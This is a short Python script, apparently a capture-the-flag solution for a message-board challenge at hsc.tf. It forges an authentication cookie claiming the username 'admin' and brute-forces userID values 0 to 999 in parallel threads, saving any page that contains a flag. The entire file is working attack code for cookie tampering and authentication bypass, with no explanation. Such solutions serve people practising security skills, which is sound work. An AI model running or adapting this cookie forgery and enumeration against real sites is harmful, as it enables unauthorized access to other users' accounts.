import requests
import queue
import threading

Q = queue.Queue()

url = "https://message-board.hsc.tf/"
for i in range(0, 1000):
    Q.put(str(i))

def getFlag(userid):
    cookies = {"userData":"j%3A%7B%22userID%22%3A%22" + userid + "%22%2C%22username%22%3A%22admin%22%7D"}
    res = requests.get(url, cookies=cookies)
    if res.text.find("flag{") != -1:
        with open("result.txt", "w") as f:
            f.write(res.text)
    else:
        print(userid)

while not Q.empty():
    userid = Q.get()
    thread = threading.Thread(target=getFlag, args=(userid, ))
    thread.start()
